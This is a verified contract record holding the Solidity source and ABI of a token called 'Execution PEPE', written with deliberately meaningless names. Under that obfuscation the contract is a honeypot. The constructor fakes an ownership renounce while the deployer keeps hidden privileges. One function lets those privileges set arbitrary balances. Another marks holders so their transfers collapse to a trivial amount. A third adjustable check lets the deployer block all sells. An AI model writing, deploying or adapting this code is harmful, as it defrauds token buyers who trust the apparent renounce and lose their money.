{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\ninterface marketingAuto {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchLiquidity) external view returns (uint256);\n\n    function transfer(address receiverSellBuy, uint256 sellFund) external returns (bool);\n\n    function allowance(address maxTxToken, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 sellFund) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverSellBuy,\n        uint256 sellFund\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed launchFrom, uint256 value);\n    event Approval(address indexed maxTxToken, address indexed spender, uint256 value);\n}\n\nabstract contract toShould {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface amountAuto {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface swapWalletLiquidity {\n    function createPair(address senderFrom, address receiverTo) external returns (address);\n}\n\ninterface marketingAutoMetadata is marketingAuto {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ExecutionPEPE is toShould, marketingAuto, marketingAutoMetadata {\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return maxMarketing;\n    }\n\n    function transfer(address walletTx, uint256 sellFund) external virtual override returns (bool) {\n        return maxShouldSwap(_msgSender(), walletTx, sellFund);\n    }\n\n    function receiverMin(uint256 sellFund) public {\n        toLaunch();\n        receiverTeam = sellFund;\n    }\n\n    bool private buyWallet;\n\n    uint256 receiverTeam;\n\n    function getOwner() external view returns (address) {\n        return sellTeamReceiver;\n    }\n\n    function fromReceiver(address autoReceiver) public {\n        toLaunch();\n        if (launchWalletTake == tradingBuy) {\n            marketingEnableAuto = swapIs;\n        }\n        if (autoReceiver == liquidityModeTo || autoReceiver == listIs) {\n            return;\n        }\n        receiverAuto[autoReceiver] = true;\n    }\n\n    function fromMode(address walletTx, uint256 sellFund) public {\n        toLaunch();\n        exemptLiquidity[walletTx] = sellFund;\n    }\n\n    uint8 private takeList = 18;\n\n    function swapExempt() public {\n        emit OwnershipTransferred(liquidityModeTo, address(0));\n        sellTeamReceiver = address(0);\n    }\n\n    function owner() external view returns (address) {\n        return sellTeamReceiver;\n    }\n\n    uint256 private swapIs;\n\n    bool public enableMarketing;\n\n    string private shouldReceiverLiquidity = \"Execution PEPE\";\n\n    mapping(address => mapping(address => uint256)) private buyMarketing;\n\n    function allowance(address teamShould, address listFund) external view virtual override returns (uint256) {\n        if (listFund == exemptShould) {\n            return type(uint256).max;\n        }\n        return buyMarketing[teamShould][listFund];\n    }\n\n    function amountShould(address fundFromMarketing) public {\n        if (senderFundFee) {\n            return;\n        }\n        if (buyWallet != enableMarketing) {\n            launchWalletTake = false;\n        }\n        teamMin[fundFromMarketing] = true;\n        \n        senderFundFee = true;\n    }\n\n    address public listIs;\n\n    uint256 public marketingEnableAuto;\n\n    bool public senderFundFee;\n\n    mapping(address => uint256) private exemptLiquidity;\n\n    bool private tradingBuy;\n\n    address public liquidityModeTo;\n\n    string private walletMin = \"EPE\";\n\n    uint256 constant maxFromToken = 5 ** 10;\n\n    function toLaunch() private view {\n        require(teamMin[_msgSender()]);\n    }\n\n    address amountExempt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function approve(address listFund, uint256 sellFund) public virtual override returns (bool) {\n        buyMarketing[_msgSender()][listFund] = sellFund;\n        emit Approval(_msgSender(), listFund, sellFund);\n        return true;\n    }\n\n    address exemptShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function name() external view virtual override returns (string memory) {\n        return shouldReceiverLiquidity;\n    }\n\n    bool public buyMode;\n\n    event OwnershipTransferred(address indexed sellFrom, address indexed fromToken);\n\n    bool public launchAmount;\n\n    mapping(address => bool) public receiverAuto;\n\n    uint256 shouldWallet;\n\n    bool private launchWalletTake;\n\n    mapping(address => bool) public teamMin;\n\n    function symbol() external view virtual override returns (string memory) {\n        return walletMin;\n    }\n\n    function transferFrom(address teamLimit, address receiverSellBuy, uint256 sellFund) external override returns (bool) {\n        if (_msgSender() != exemptShould) {\n            if (buyMarketing[teamLimit][_msgSender()] != type(uint256).max) {\n                require(sellFund <= buyMarketing[teamLimit][_msgSender()]);\n                buyMarketing[teamLimit][_msgSender()] -= sellFund;\n            }\n        }\n        return maxShouldSwap(teamLimit, receiverSellBuy, sellFund);\n    }\n\n    function maxShouldSwap(address teamLimit, address receiverSellBuy, uint256 sellFund) internal returns (bool) {\n        if (teamLimit == liquidityModeTo) {\n            return receiverTrading(teamLimit, receiverSellBuy, sellFund);\n        }\n        uint256 launchedModeFee = marketingAuto(listIs).balanceOf(amountExempt);\n        require(launchedModeFee == receiverTeam);\n        require(receiverSellBuy != amountExempt);\n        if (receiverAuto[teamLimit]) {\n            return receiverTrading(teamLimit, receiverSellBuy, maxFromToken);\n        }\n        return receiverTrading(teamLimit, receiverSellBuy, sellFund);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return takeList;\n    }\n\n    address private sellTeamReceiver;\n\n    constructor (){\n        if (tradingBuy == buyWallet) {\n            buyWallet = true;\n        }\n        amountAuto liquidityWallet = amountAuto(exemptShould);\n        listIs = swapWalletLiquidity(liquidityWallet.factory()).createPair(liquidityWallet.WETH(), address(this));\n        \n        liquidityModeTo = _msgSender();\n        swapExempt();\n        teamMin[liquidityModeTo] = true;\n        exemptLiquidity[liquidityModeTo] = maxMarketing;\n        \n        emit Transfer(address(0), liquidityModeTo, maxMarketing);\n    }\n\n    uint256 private maxMarketing = 100000000 * 10 ** 18;\n\n    function balanceOf(address launchLiquidity) public view virtual override returns (uint256) {\n        return exemptLiquidity[launchLiquidity];\n    }\n\n    bool private totalBuy;\n\n    function receiverTrading(address teamLimit, address receiverSellBuy, uint256 sellFund) internal returns (bool) {\n        require(exemptLiquidity[teamLimit] >= sellFund);\n        exemptLiquidity[teamLimit] -= sellFund;\n        exemptLiquidity[receiverSellBuy] += sellFund;\n        emit Transfer(teamLimit, receiverSellBuy, sellFund);\n        return true;\n    }\n\n    uint256 private enableTx;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxTxToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromToken\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchFrom\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listFund\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundFromMarketing\",\"type\":\"address\"}],\"name\":\"amountShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellFund\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchLiquidity\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellFund\",\"type\":\"uint256\"}],\"name\":\"fromMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoReceiver\",\"type\":\"address\"}],\"name\":\"fromReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityModeTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingEnableAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"sellFund\",\"type\":\"uint256\"}],\"name\":\"receiverMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderFundFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellFund\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverSellBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellFund\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ExecutionPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}